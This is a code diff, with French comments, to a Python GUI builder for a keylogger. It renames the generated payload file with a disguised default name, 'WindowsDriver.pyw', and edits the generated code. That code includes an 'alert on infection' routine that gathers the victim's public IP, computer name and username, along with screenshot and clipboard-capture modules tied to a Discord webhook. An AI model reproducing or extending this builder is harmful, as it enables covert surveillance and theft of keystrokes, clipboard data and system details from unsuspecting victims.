@@ -34,7 +34,6 @@ ctk.set_default_color_theme("dark-blue")
 # ---------------- VARIABLES GLOBALES ----------------
 debut_heure = None
 fin_heure = None
-nom_fichier = "NetworkDriver"  
 
 # ---------------- FONCTIONS ----------------
 def valider_webhook():
@@ -43,27 +42,48 @@ def valider_webhook():
 
 
 # Option choix du nom du keylogs
+nom_fichier = "WindowsDriver"
+temp_script = None  
+
 def nom_keylogs():
-    global nom_fichier
+    global nom_fichier, temp_script
+
     nom_window = ctk.CTkToplevel(app)
     nom_window.geometry("400x200")
-    nom_window.title("Choix du nom du keylogs")
+    nom_window.title("Choix du nom du fichier")
 
-    nom_label = ctk.CTkLabel(nom_window, text="Entrez le nom du fichier keylogs sans l'extension:", font=ctk.CTkFont(size=14))
+    nom_label = ctk.CTkLabel(
+        nom_window,
+        text="Entrez le nom du fichier sans l'extension :",
+        font=ctk.CTkFont(size=14)
+    )
     nom_label.pack(pady=10)
+
     nom_entry = ctk.CTkEntry(nom_window, width=200, font=ctk.CTkFont(size=14))
     nom_entry.pack(pady=10)
 
     def valider():
-        global nom_fichier
+        global nom_fichier, temp_script
         nom = nom_entry.get().strip()
+
         if nom == "":
-            messagebox.showerror("Si aucun nom choisi le nom sera (WindowsDriver) ")
-        nom_fichier = nom
+            messagebox.showerror("Erreur", "Aucun nom entré. Le fichier sera WindowsDriver.pyw")
+            nom_fichier = "WindowsDriver"
+        else:
+            nom_fichier = nom
+
+        temp_script = f"{nom_fichier}.pyw"
+
         nom_window.destroy()
 
-    valider_nom_btn = ctk.CTkButton(nom_window, text="Valider", font=ctk.CTkFont(size=14), command=valider)
+    valider_nom_btn = ctk.CTkButton(
+        nom_window,
+        text="Valider",
+        font=ctk.CTkFont(size=14),
+        command=valider
+    )
     valider_nom_btn.pack(pady=20)
+
 
 # ---------------- OPTIONS ----------------
 def screenshot_option_func():
@@ -201,7 +221,6 @@ def lancer_programme():
 
 
 
-temp_script = f"{nom_fichier}.pyw"
 
 
 def pyw():
@@ -260,8 +279,7 @@ def pyw():
                 'ordi = platform.node()\n'
                 'hostname = socket.gethostname()\n\n'
                 'def alert_on_infection_option_func():\n'
-                '    ip = requests.get("https://api.ipify.org").text\n'
-                '    discord_webhook = WEBHOOK\n'
+                '    ip = requests.get("https://api.ipify.org").text\n\n'
                 '    name = (\n'
                 '        f"Nom de l\'ordinateur : {ordi}\\n"\n'
                 '        f"Utilisateur actuel : {getpass.getuser()}\\n"\n'
@@ -362,6 +380,7 @@ def pyw():
         # Clipboard
         if config["options"]["clipboard"]:
             f.write("import clipboard, time, requests\n")
+            f.write("import io\nfrom PIL import ImageGrab\n")
             f.write("def clipboard_option_func():\n")
             f.write("    old = clipboard.paste()\n")
             f.write("    while True:\n")
@@ -654,3 +673,5 @@ with open("logs.txt", "a") as fichier:
 
 def key():
     app.mainloop()
+
+key()
